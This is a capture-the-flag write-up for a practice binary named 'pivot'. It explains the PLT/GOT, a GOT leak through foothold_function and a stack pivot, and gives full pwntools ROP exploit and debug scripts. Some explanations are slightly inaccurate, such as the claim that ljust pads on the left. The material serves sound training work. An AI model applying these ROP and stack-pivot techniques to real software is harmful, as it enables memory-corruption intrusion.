# Challenge Theory
This is dynamic rop challenge with a "ret2win" function, and a stack pivot.
The catch is that the "ret2win" function is not actually imported.
# Solution Theory
There is a function called "foothold_function" which will populate an address in the got.
This address will be an address in the library that contains the "ret2win" function.
This means the attacker can calculate the offset from the address of the "foothold_function" to the address of the "ret2win" function.
# Background Technical Information
There is a lot of information needed to solve this challenge.
The most important concepts are the plt, and the got.
These things serve to enable dynamic calling of functions.
This means that the binary can call functions from other libraries, and load them in using the got and plt.
## GOT Explanation
The got is simply a large list of addresses from a specific offset.
These addresses are the address of functions from outside the binary.
An important thing to note is that the got entries have a static place within the binary, but contain dynamic addresses.
For example, the got entry for the "foothold_function" will be a different address, but that address will also be at the same space in memory.
This is actually why the pwntools library can parse the got, after the address has been populated.
## PLT Explanation
The plt will create plt stubs which will populate the got when first called, and then jump to that address using an offset after it has been resolved.
This means calling a plt address of a function, is the same as calling the function, because it will either resolve the function and jump, or it will just jump to the function itself.
## Stack Pivot Explantion
Stack pivoting is simple, just change the address of the rsp register to a different location.
This can be done because the attacker needs more space.
# Solution Theory
## Overall Strategy
The overall strategy is calculate the offset of the "foothold_function" from the "ret2win" function within the binary.
Populate the got with the foothold function address, leak said address, and then redirect code execution back to main.
This is so the next set of payloads can call the "ret2win" function using the new memory address, and the calculated offset.
## Calculating the Offset
This can be done many ways.
An automated way would be to use pwntools:
```python
import pwn
binary = "pivot"

pwn.context.binary = binary
pwn.context.encoding = "latin"

lib = pwn.ELF("libpivot.so")
lib.symbols["foothold_function"] - lib.symbols["ret2win"]
-279
```
This can be done with a debugger, or some kind of reverse engineering tool like ghidra as well.
## Payload 1
Payload 1 is supposed to populate the address of the got for the "foothold_function", and then leak it using puts.
Finally, it redirects back to main, in order to actually finish the exploit.
This looks like:
```python
    payload_1 = pwn.flat(
        pwn.p64(gadgets["foothold_function@plt"]),
        pwn.p64(gadgets["pop_rdi_ret"]),
        pwn.p64(gadgets["foothold_function@got"]),
        pwn.p64(gadgets["puts@plt"]),
        pwn.p64(gadgets["main"]),
        b"\n"
    ) 
```
In simple terms this calls the "foothold_function", and then leaks the new address by calling puts with the argument of that address.
Then it just calls "main".
## Payload 2
This one overflows the stack, and then pivots to the address containing the first payload:
```python
    payload_2 = pwn.flat(
        b"A"*padding,
        pwn.p64(gadgets["pop_rax_ret"]),
        pwn.p64(int(leak.strip(), 16)),
        pwn.p64(gadgets["xchg_rsp_rax"])
    )
```
## Payload 3
This payload doesn't do anything:
```python
    payload_3 = pwn.flat(
        pwn.asm('nop'),
        b"\n"
    )
```
## Payload 4
This payload smashes the stack, and then calls the "ret2win" function:
```python
    payload_4 = pwn.flat(
        b"A"*padding,
        pwn.p64(pwn.u64(leak_foothold) + lib_got_offset)
    )
```
# Full Solution
Full script which actually builds the payloads using the leaks.
## Full Exploit Script
```python
#!/usr/bin/python3
import pwn
import sys
import time
binary = "pivot"
pwn.context.binary = binary
pwn.context.encoding = "latin"

'''
exploit:
    call foothold function to populate got
    call puts on new foothold function in order to leak value
    redirect back to main in order to send new rop chain which will call ret2win

    payload 1: (pivoted)
        resolve + leak

    payload 2: (pivoter)
        stack smash + stack pivot
        
    payload 3: (pivoter)
        nop

    payload 4: (pivoted)
        call ret2win with custom address
'''

gadgets = {
    "pop_rax_ret":0x4009bb,
    "xchg_rsp_rax":0x4009bd,
    "mov_rax_ptr_rax":0x4009c0,
    "add_rax_rbp":0x4009c4,
    "pop_rdi_ret":0x400a33,
    "foothold_function@plt":0x400720,
    "foothold_function@got":0x601040,
    "puts@plt":0x4006e0,
    "main":0x400847
}

padding = 40
lib_got_offset = 279
debug_script = ""

with open("debug.gdb", "r") as file_io:
    debug_script += file_io.read()

with pwn.process(binary) as io:

    io.recvuntil(": ")
    leak = io.recvline().strip()
    pwn.info(f"leak found {leak}")

    payload_1 = pwn.flat(
        pwn.p64(gadgets["foothold_function@plt"]),
        pwn.p64(gadgets["pop_rdi_ret"]),
        pwn.p64(gadgets["foothold_function@got"]),
        pwn.p64(gadgets["puts@plt"]),
        pwn.p64(gadgets["main"]),
        b"\n"
    ) 
    
    payload_2 = pwn.flat(
        b"A"*padding,
        pwn.p64(gadgets["pop_rax_ret"]),
        pwn.p64(int(leak.strip(), 16)),
        pwn.p64(gadgets["xchg_rsp_rax"])
    )

    payload_3 = pwn.flat(
        pwn.asm('nop'),
        b"\n"
    )

    io.send(payload_1)
    pwn.info(io.recv(4096))
    io.send(payload_2)

    for x in range(5):
        pwn.info(io.recvline())

    # make the leak left justified, and add null bytes if needed
    leak_foothold = io.recvline().strip().ljust(8,b'\x00')

    pwn.info(leak_foothold)
    pwn.info(f"Unpacked leak: {type(pwn.u64(leak_foothold))}")

    payload_4 = pwn.flat(
        b"A"*padding,
        pwn.p64(pwn.u64(leak_foothold) + lib_got_offset)
    )

    io.send(payload_3)
    pwn.info(io.recv(4096))
    io.send(payload_4)
    pwn.info(io.readrepeat(2))
```
There are two things to note in this script.
The first thing is this line:
```python
leak_foothold = io.recvline().strip().ljust(8,b'\x00')
```
This piece of code strips out any newlines, and then adds trailing null bytes.
This is because the shell were the output came from does not emit extra null bytes.
It also adds them to the left, to make sure that the little endianess is preserved when it is unpacked.
The only other piece of code that has not been explained would be this for loop:
```python
    for x in range(5):
        pwn.info(io.recvline())
```
Receiving like this just makes it easier to parse out the leaked got address.
# Debugging Info
A script was used to debug the payloads. 
## Debug Script:
```python
#!/usr/bin/python3
import pwn
import sys
binary = "./pivot"
pwn.context.binary = binary
pwn.context.encoding = "latin"
pwn.context.log_level = "debug"

gadgets = {
    "pop_rax_ret":0x4009bb,
    "xchg_rsp_rax":0x4009bd,
    "mov_rax_ptr_rax":0x4009c0,
    "add_rax_rbp":0x4009c4,
    "pop_rdi_ret":0x400a33,
    "foothold_function@plt":0x400720,
    "foothold_function@got":0x601040,
    "puts@plt":0x4006e0,
    "main":0x400847
}

padding = 40
lib_got_offset = 279
debug_script = ""

with open("debug.gdb", "r") as file_io:
    debug_script += file_io.read()

payload_1 = pwn.flat(
    pwn.p64(gadgets["foothold_function@plt"]),
    pwn.p64(gadgets["pop_rdi_ret"]),
    pwn.p64(gadgets["foothold_function@got"]),
    pwn.p64(gadgets["puts@plt"]),
    pwn.p64(gadgets["main"]),
    b"\n"
) 

io = pwn.gdb.debug(binary, gdbscript=debug_script, log_level="debug")
io.recvuntil(": ")
leak = io.recvline().strip()
pwn.info(f"leak found {leak}")

payload_2 = pwn.flat(
    b"A"*padding,
    pwn.p64(gadgets["pop_rax_ret"]),
    pwn.p64(int(leak, 16)),
    #pwn.p64(address),
    pwn.p64(gadgets["xchg_rsp_rax"])
)

payload_3 = pwn.flat(
    pwn.asm('nop'),
    b"\n"
)

payload_4 = pwn.flat(
    b"A"*padding,
    pwn.p64(gadgets["foothold_function@got"] + lib_got_offset)
)
```
This will actually launch the process under gdb and run the debug script.
## GDB Script
```bash
b *main
b *pwnme+113
b *pwnme+170
b *0x4009bb
b *0x4009bd
b *0x4009c0
```
All of these things combined can let the attacker import the debug script into ipython, then send the different payloads, and debug them in memory
This way the payloads can also be built using information extracted from the program.
Since the session can use these:
```python
io.send(payload_1)
```
and:
```python
pwn.info(io.recv(4096))
```